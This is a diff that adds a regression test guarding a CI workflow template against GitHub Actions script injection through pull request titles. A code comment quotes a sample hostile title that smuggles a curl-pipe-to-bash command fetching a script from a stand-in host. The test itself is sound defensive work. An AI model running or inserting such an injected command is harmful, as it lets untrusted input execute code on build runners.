@@ -149,6 +149,16 @@ describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () =
     expect(content).toContain("# bkit-stub:bkit-tests-e2e");
   });
 
+  it("never inlines a PR title into a run: body (GitHub Actions script injection)", () => {
+    // A `${{ github.event.pull_request.title }}` expanded into shell text lets a PR titled
+    // `"; curl evil.sh | bash; "` run on the consumer's CI runner. User-controlled text MUST
+    // arrive via env: (runtime expansion, injection-safe). Guards the snapshot below from
+    // silently re-blessing a reintroduced inline interpolation.
+    expect(content).not.toMatch(/MSG="\$\{\{\s*github\.event\.pull_request\.title\s*\}\}"/);
+    expect(content).toContain("PR_TITLE: ${{ github.event.pull_request.title }}");
+    expect(content).toMatch(/MSG="\$PR_TITLE"/);
+  });
+
   it("snapshot matches expected template content (regression guard)", () => {
     expect(content).toMatchSnapshot();
   });
